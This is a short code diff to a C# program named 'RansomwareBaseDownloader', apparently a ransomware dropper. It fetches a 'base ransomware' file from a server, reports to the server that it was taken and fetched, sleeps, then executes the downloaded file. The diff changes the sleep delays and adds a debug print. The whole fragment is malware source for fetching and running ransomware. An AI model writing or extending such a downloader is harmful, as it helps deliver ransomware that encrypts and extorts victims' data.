@@ -24,7 +24,8 @@ namespace RansomwareBaseDownloader
             Thread.Sleep(2000);
             serverCommunicator.setRansomwareFilePath();
             serverCommunicator.getBaseRansomware();
-            Thread.Sleep(2000);
+            Console.WriteLine(serverCommunicator.getNAMEONTEST());
+            Thread.Sleep(10000);
             //Install ransomware
 
             serverCommunicator.postBaseTaken();
@@ -37,7 +38,7 @@ namespace RansomwareBaseDownloader
 
             serverCommunicator.postBaseFetched();
 
-            Thread.Sleep(120000);
+            Thread.Sleep(60000);
 
             programExecuter.executeProgram(serverCommunicator.getRansomwareFilePath());
 
